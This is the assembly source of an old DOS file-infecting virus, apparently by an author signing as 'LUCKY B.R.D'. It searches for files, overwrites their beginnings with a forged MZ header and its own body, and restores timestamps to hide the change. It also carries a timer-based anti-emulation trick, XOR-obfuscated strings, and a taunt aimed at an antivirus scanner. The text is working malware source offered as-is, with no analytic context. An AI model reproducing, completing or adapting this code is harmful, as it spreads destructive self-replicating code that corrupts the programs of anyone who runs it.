.model tiny
.code
org 100h
start:
	call xor_loop
        mov bh,4eh
	xchg	ax,bx
search:
        mov cx,06h
        mov si,offset fmask
        call @xor       ;  '*.exe', 0h
        mov cx,20h
        int 21h
        jnc est_eshe_poroh_v_porohovnitsah
        call quit       
est_eshe_poroh_v_porohovnitsah:
        mov cx,06h
        jmp obmanem_etu_sranuyu_windu
        nop 
        add [bx][si],al ; 00h, 00h
        add al,00h      ; 04h, 00h
        db 00h          ; 00h
obmanem_etu_sranuyu_windu:
        mov si,offset fmask
        call @xor
        call savtim  
        cmp word ptr ds:[9ah], virlen
        jbe findnext    ; NE-exe ?
        mov dx,9eh
        call open       
        jc findnext
        xchg ax,bx
        call fopen_via_sft 
        mov dx,400h
        call seek       ;  400h
        call compare
        cmp word ptr ds:[slovo],'EN' ; NE-exe?
        jnz close       
        mov dx,200h
        call seek
        call compare
        cmp word ptr ds:[slovo],'Sè' ; NE-exe?
        jnz close
        mov dx,20h
        call seek
        call compare
        cmp word ptr ds:[slovo],04eb4h 
        jz close
        xor dx,dx
        call seek
        mov bh,40h 
	xchg ax,bx
	mov dx,offset mz 
        mov cx,20h
        int 21h
        mov bh,40h 
	xchg ax,bx
	mov cx,virlen
        mov dx,100h
        int 21h
close:
        call xor_loop
	call resttim
        call @close 
findnext:
        mov bh,4fh 
	xchg ax,bx
	jmp search

fopen_via_sft:
        push bx
        push es
        push di
        mov ax,1220h
        push ax
        int 2fh
        mov bl, byte ptr es:[di]
        pop ax
        sub al,0ah
        int 2fh
        mov word ptr es:[di+02h],02h
        pop di
        pop es
        pop bx
        ret

@xor:
        push ax
        in al,42h
        mov ah,al
        in al,42h
        cmp al,ah
        jnz @web_idiot
        ret
@web_idiot:
        pop ax
        push si
@@xor:
        xor byte ptr [si],0dbh
        inc si
        loop @@xor
        pop dx
        ret

seek:
        xor cx,cx
        mov cx,4200h
	xchg ax,cx
	int 21h
        ret

open:
        mov cx,3d00h
	xchg ax,cx
	int 21h
        ret

savtim:
        mov ax, word ptr ds:[96h]
        mov word ptr ds:[ftime], ax
        mov ax, word ptr ds:[98h]
        mov word ptr ds:[ftime+02h], ax
        ret

resttim:
        mov cx,5701h
	xchg ax,cx
        mov cx, word ptr ds:[ftime]
        mov dx, word ptr ds:[ftime+02h]
        int 21h
        ret

@close:
        mov bh,3eh
	xchg ax,bx
	int 21h
        ret

compare:
        mov cx,02h
        mov bh,3fh
	xchg ax,bx
	mov dx,offset slovo
        int 21h
        ret

mz      db 'M'
        db 'Z'
        db 9fh, 01h, 01h
        db 03h dup (0h)
        db 02h
        db 03h dup (0h)
        db 0ffh, 0ffh, 0f0h, 0ffh
        db 05h dup (0h)
        db 01h, 0f0h, 0ffh
        db 1ch
        db 07h dup (0h)

fmask   db '*' xor 0dbh
        db '.' xor 0dbh
        db 't' xor 0dbh
        db 'x' xor 0dbh
        db 't' xor 0dbh
        db 0h  xor 0dbh

win     db 'T' xor 0dbh, 'h' xor 0dbh, 'i' xor 0dbh, 's' xor 0dbh
        db 20h xor 0dbh, 'p' xor 0dbh, 'r' xor 0dbh, 'o' xor 0dbh
        db 'g' xor 0dbh, 'r' xor 0dbh, 'a' xor 0dbh, 'm' xor 0dbh, 'm' xor 0dbh
        db 20h xor 0dbh, 'r' xor 0dbh, 'e' xor 0dbh, 'q' xor 0dbh
        db 'u' xor 0dbh, 'i' xor 0dbh, 'r' xor 0dbh, 'e' xor 0dbh
        db 's' xor 0dbh, 20h xor 0dbh, 'M' xor 0dbh, 'i' xor 0dbh
        db 'c' xor 0dbh, 'r' xor 0dbh, 'o' xor 0dbh, 's' xor 0dbh
        db 'o' xor 0dbh, 'f' xor 0dbh, 't' xor 0dbh, 20h xor 0dbh
        db 'W' xor 0dbh, 'i' xor 0dbh, 'n' xor 0dbh, 'd' xor 0dbh
        db 'o' xor 0dbh, 'w' xor 0dbh, 's' xor 0dbh, '.' xor 0dbh
        db 0dh xor 0dbh, 0ah xor 0dbh, '$' xor 0dbh
end_win:

author  db '-' xor 0dbh, '=' xor 0dbh, 20h xor 0dbh
        db 'L' xor 0dbh, 'U' xor 0dbh, 'C' xor 0dbh, 'K' xor 0dbh, 'Y' xor 0dbh
	db 20h xor 0dbh, 'B' xor 0dbh, '.' xor 0dbh, 'R' xor 0dbh, '.' xor 0dbh
	db 'D' xor 0dbh
	db 20h xor 0dbh, '1' xor 0dbh, '9' xor 0dbh, '9' xor 0dbh, '4' xor 0dbh
        db '-' xor 0dbh, '9' xor 0dbh, '7' xor 0dbh, 20h xor 0dbh
	db '=' xor 0dbh, '-' xor 0dbh

zoo     db 'S' xor 0dbh, 'U' xor 0dbh, 'C' xor 0dbh, 'H' xor 0dbh
        db 'E' xor 0dbh, 'N' xor 0dbh, 'D' xor 0dbh, 20h xor 0dbh
        db 'B' xor 0dbh, 'L' xor 0dbh, 'I' xor 0dbh, 'C' xor 0dbh
        db 'K' xor 0dbh, 'T' xor 0dbh, 20h xor 0dbh, 'S' xor 0dbh
        db 'I' xor 0dbh, 'C' xor 0dbh, 'H' xor 0dbh, 20h xor 0dbh
        db 'L' xor 0dbh, 'U' xor 0dbh, 'C' xor 0dbh, 'K' xor 0dbh
	db 'Y' xor 0dbh, 20h xor 0dbh, 'U' xor 0dbh, 'M' xor 0dbh
	db 20h xor 0dbh, 'E' xor 0dbh, 'S' xor 0dbh, 20h xor 0dbh
	db 'S' xor 0dbh, 'O' xor 0dbh, 'L' xor 0dbh, 'L' xor 0dbh
	db 20h xor 0dbh, 'D' xor 0dbh, 'A' xor 0dbh, 20h xor 0dbh
	db 'E' xor 0dbh, 'I' xor 0dbh, 'N' xor 0dbh, 'E' xor 0dbh
	db 'N' xor 0dbh, 20h xor 0dbh, 'T' xor 0dbh, 'Y' xor 0dbh
	db 'P' xor 0dbh, 'E' xor 0dbh, 'N' xor 0dbh, 20h xor 0dbh
	db 'N' xor 0dbh, 'A' xor 0dbh, 'M' xor 0dbh, 'E' xor 0dbh
	db 'N' xor 0dbh, 'S' xor 0dbh, 20h xor 0dbh, 'V' xor 0dbh
	db 'I' xor 0dbh, 'R' xor 0dbh, 'S' xor 0dbh, 'C' xor 0dbh
	db 'A' xor 0dbh, 'N' xor 0dbh, 20h xor 0dbh, 'G' xor 0dbh
	db 'E' xor 0dbh, 'B' xor 0dbh, 'E' xor 0dbh, 'N' xor 0dbh
	include	jacof.asm
quit:   
	call	xor_loop
        mov cx,end_win - win
        mov si,offset win
        call @xor
        mov bh,09h 
        int 21h
	mov cx,4c01h
	xchg ax,cx
	int	21h
slovo	equ	0f000h
ftime	equ	slovo	-	04h
virlen	equ	$	-	start
end	start
	
